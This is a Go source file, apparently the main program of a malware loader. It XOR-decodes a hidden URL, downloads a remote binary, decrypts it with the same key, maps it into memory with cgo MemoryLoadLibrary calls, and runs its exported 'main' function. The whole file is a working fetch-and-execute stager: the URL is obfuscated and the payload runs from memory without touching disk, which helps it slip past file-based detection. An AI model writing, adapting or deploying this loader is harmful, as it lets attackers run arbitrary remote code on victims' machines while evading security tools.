package main

// #cgo CFLAGS: -I"../loader/mem/"
// #cgo LDFLAGS: -L"../loader/mem/"
// #include "memod.h"
import "C"

import (
	"io"
	"net/http"
	"syscall"
	"unsafe"
)

func DecodeXor(in []byte, key byte) {
	for i := 0; i < len(in); i++ {
		in[i] ^= key
	}
}

func GetPayload(url string) ([]byte, bool) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, false
	}
	defer resp.Body.Close()

	payload, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, false
	}

	return payload, true
}

func main() {

	xorKey := byte('A')
	url := []byte{
		0x29, 0x35, 0x35, 0x31, 0x32, 0x7b, 0x6e, 0x6e, 0x26, 0x28, 0x35, 0x29,
		0x34, 0x23, 0x6f, 0x22, 0x2e, 0x2c, 0x6e, 0x2b, 0x34, 0x2d, 0x24,
		0x32, 0x26, 0x33, 0x22, 0x71, 0x6e, 0x00, 0x05, 0x13, 0x6e, 0x33,
		0x20, 0x36, 0x6e, 0x2c, 0x20, 0x28, 0x2f, 0x6e, 0x00, 0x05, 0x13,
		0x6f, 0x23, 0x28, 0x2f,
	}

	DecodeXor(url, xorKey)
	payload, result := GetPayload(string(url))
	if !result {
		return
	}

	DecodeXor(payload, xorKey)
	handle := C.MemoryLoadLibrary(unsafe.Pointer(&payload[0]), C.ulonglong(len(payload)))
	if handle == nil {
		return
	}

	cname := C.CString("main")
	defer C.free(unsafe.Pointer(cname))

	addr := unsafe.Pointer(C.MemoryGetProcAddress(handle, cname))
	syscall.SyscallN(uintptr(addr), uintptr(0), 0, 0, 0)

	C.MemoryFreeLibrary(handle)

	if addr == nil {
		return
	}
	return
}
